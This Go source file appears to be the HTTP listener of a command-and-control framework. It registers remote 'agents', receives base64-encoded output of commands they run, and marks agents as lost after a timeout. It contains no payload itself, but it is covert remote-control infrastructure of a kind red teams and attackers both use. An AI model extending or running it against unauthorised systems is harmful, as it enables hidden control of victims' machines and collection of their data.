package server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var BindIp string
var AgentTimeouts map[string]time.Time = make(map[string]time.Time)
var AgentTimeoutMutex sync.RWMutex
var AgentTimeoutDuration time.Duration = 120 * time.Second // Timeout for agents (2 minutes by default)

type CommandResponse struct {
	Command string `json:"command"`
	Output  string `json:"output"`
	AgentID string `json:"agentid"`
	Success bool   `json:"success"`
}

type Agent struct {
	AgentId           string
	Username          string
	ChatUrl           string
	AuthToken         string
	CommandHistory    []string
	CommandHistoryCmd []string
	LastSeen          time.Time
	Status            string // "active", "idle", "lost"
}

type KeepaliveResponse struct {
	AgentID   string `json:"agentid"`
	Username  string `json:"username"`
	Random    string `json:"random"`
	Timestamp int64  `json:"timestamp"`
}

func StartHttpListener(agentChan chan Agent, commandResponsesChan chan CommandResponse) {
	http.HandleFunc("/hello/", func(w http.ResponseWriter, r *http.Request) {
		base64EncodedAgent := strings.TrimPrefix(r.URL.Path, "/hello/")
		decoded, _ := base64.StdEncoding.DecodeString(base64EncodedAgent)

		var agent Agent
		_ = json.Unmarshal(decoded, &agent)

		// Set the agent as active and update last seen time
		agent.Status = "active"
		agent.LastSeen = time.Now()
		updateAgentTimeout(agent.AgentId)

		agentChan <- agent
	})

	http.HandleFunc("/command/", func(w http.ResponseWriter, r *http.Request) {
		encodedResponse := strings.TrimPrefix(r.URL.Path, "/command/")
		decoded, _ := base64.StdEncoding.DecodeString(encodedResponse)

		var response CommandResponse
		_ = json.Unmarshal(decoded, &response)

		// Update agent timeout on command response
		updateAgentTimeout(response.AgentID)

		commandResponsesChan <- response
	})

	http.HandleFunc("/keepalive/", func(w http.ResponseWriter, r *http.Request) {
		encodedKeepalive := strings.TrimPrefix(r.URL.Path, "/keepalive/")
		decoded, _ := base64.StdEncoding.DecodeString(encodedKeepalive)

		var keepalive KeepaliveResponse
		_ = json.Unmarshal(decoded, &keepalive)

		// Update agent timeout
		updateAgentTimeout(keepalive.AgentID)
	})

	// Start goroutine to monitor agent timeouts
	go monitorAgentTimeouts()

	err := http.ListenAndServe(BindIp+":80", nil)
	if err != nil {
		fmt.Fprint(os.Stderr, err)
		os.Exit(1)
	}
}

// updateAgentTimeout updates the last seen time for an agent
func updateAgentTimeout(agentID string) {
	AgentTimeoutMutex.Lock()
	defer AgentTimeoutMutex.Unlock()
	AgentTimeouts[agentID] = time.Now()
}

// checkAgentTimeout checks if an agent has timed out
func checkAgentTimeout(agentID string) bool {
	AgentTimeoutMutex.RLock()
	defer AgentTimeoutMutex.RUnlock()

	lastSeen, exists := AgentTimeouts[agentID]
	if !exists {
		return true // Agent never seen, consider it timed out
	}

	return time.Since(lastSeen) > AgentTimeoutDuration
}

// getAgentStatus returns the current status of an agent
func getAgentStatus(agentID string) string {
	if checkAgentTimeout(agentID) {
		return "lost"
	}
	return "active"
}

// monitorAgentTimeouts periodically checks for agent timeouts
func monitorAgentTimeouts() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		AgentTimeoutMutex.RLock()
		now := time.Now()
		for _, lastSeen := range AgentTimeouts {
			if now.Sub(lastSeen) > AgentTimeoutDuration {
				// Agent has timed out, but we don't remove it from the map
				// so that we can still track that it was once connected
				// It will be marked as "lost" by getAgentStatus
			}
		}
		AgentTimeoutMutex.RUnlock()
	}
}
